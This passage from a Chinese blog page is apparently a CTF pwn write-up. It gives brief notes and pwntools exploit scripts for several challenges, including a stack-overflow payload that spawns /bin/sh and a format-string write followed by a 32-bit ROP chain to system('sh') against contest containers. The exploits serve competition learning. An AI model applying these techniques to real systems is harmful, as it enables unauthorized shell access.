class="hljs-string">&#x27;You have chosen to develop obscene and wait for level improvement\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<span class="hljs-comment">#HR=9999    #flag=0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7612</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;You use your coquettish moves to attack the boss and deduct 1 health from it&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    HR-=<span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(HR)<br><span class="hljs-comment">#pause()</span><br>p.sendlineafter(<span class="hljs-string">&#x27;You use your coquettish moves to attack the boss and deduct 1 health from it\n&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<span class="hljs-comment">#game=0</span><br><br><span class="hljs-comment">#p.sendlineafter(&#x27;You have three choices in front of you&#x27;,b&#x27;1&#x27;)#HP-1</span><br>p.sendlineafter(<span class="hljs-string">&#x27;Please make your choice.&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x200</span>+<span class="hljs-number">2</span>*p64(<span class="hljs-number">0</span>)+<span class="hljs-string">b&#x27;/bin/sh&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&#x27;Congratulation&#x27;</span>,payload)<br>p.interactive()<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">HP == 2387 &amp;&amp; mark == 1 &amp;&amp; !flag &amp;&amp; level == 2613</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="ezez"><a href="#ezez" class="headerlink" title="ezez"></a>ezez</h2><h3 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h3><p>没有漏洞，只需要完成3000道计算题即可</p>
+<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *  <br>  <br>io = remote(<span class="hljs-string">&#x27;node01.container.race.nynusec.com&#x27;</span>, <span class="hljs-number">21028</span>)  <br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>  <br>   <br>io.recvuntil(<span class="hljs-string">&#x27;Calculate 3000 questions within the specified time frame and I will give you flag\n&#x27;</span>)  <br>expression = io.recvline().decode().strip()  <span class="hljs-comment">#接收数据</span><br>answer = <span class="hljs-built_in">eval</span>(expression)  <span class="hljs-comment">#计算</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;The answer is: <span class="hljs-subst">&#123;answer&#125;</span>&quot;</span>)  <br>io.sendlineafter(<span class="hljs-string">&quot;Input your answer\n&quot;</span>,<span class="hljs-built_in">str</span>(answer))<br>count=<span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    expression = io.recvline().decode().strip()  <br>    answer = <span class="hljs-built_in">eval</span>(expression)<br>    count+=<span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;conut:&quot;</span>,count)<br>    io.sendlineafter(<span class="hljs-string">&quot;Input your answer\n&quot;</span>,<span class="hljs-built_in">str</span>(answer))<br>    <span class="hljs-keyword">if</span> count == <span class="hljs-number">3000</span>:  <br>            <span class="hljs-keyword">break</span> <br>io.interactive()<br><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="pppppwn"><a href="#pppppwn" class="headerlink" title="pppppwn"></a>pppppwn</h2><h3 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h3><p>漏洞：格式化字符串 栈溢出</p>
+<p>因为是32位题目，构造rop时只需要构造栈帧产参：system_plt, blank,binsh</p>
+<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&#x27;node01.container.race.nynusec.com&#x27;</span>,<span class="hljs-number">22194</span>)<br><span class="hljs-comment">#p=gdb.debug(&#x27;./pppppwn&#x27;)</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>seed=<span class="hljs-number">0x0804A08C</span><br>sys_plt=<span class="hljs-number">0x080484E0</span><br>sh=<span class="hljs-number">0x0804830A</span><br>p.recvuntil(<span class="hljs-string">&#x27;Play game\n&#x27;</span>)<br>pay=fmtstr_payload(<span class="hljs-number">6</span>,&#123;seed:<span class="hljs-number">4</span>&#125;)<br>p.sendline(pay)<br>p.recvuntil(<span class="hljs-string">&quot;Good job!&quot;</span>)<br>pay=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">28</span>+p32(sys_plt)+p32(<span class="hljs-number">0</span>)+p32(sh)<br>p.sendline(pay)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%93/" class="category-chain-item">刷题总结</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/pwn/" class="print-no-link">#pwn</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>s4_pwn_wp</div>
+      <div>http://example.com/2023/12/05/s4-pwn-wp/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>fan fan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年12月5日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/10/09/CVE-2022-0847/" title="CVE-2022-0847">
+                        <span class="hidden-mobile">CVE-2022-0847</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      京ICP证123456号
+    </a>
+  </span>
+  
+    
+      <span>
+        <a
+          href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=12345678"
+          rel="nofollow noopener"
+          class="beian-police"
+          target="_blank"
+        >
+          
+            <span style="visibility: hidden; width: 0">|</span>
+            <img src="/img/police_beian.png" srcset="/img/loading.gif" lazyload alt="police-icon"/>
+          
+          <span>京公网安备12345678号</span>
+        </a>
+      </span>
+    
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicRibbon.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/runtime.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicLine.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/Cherry.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/star.min.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
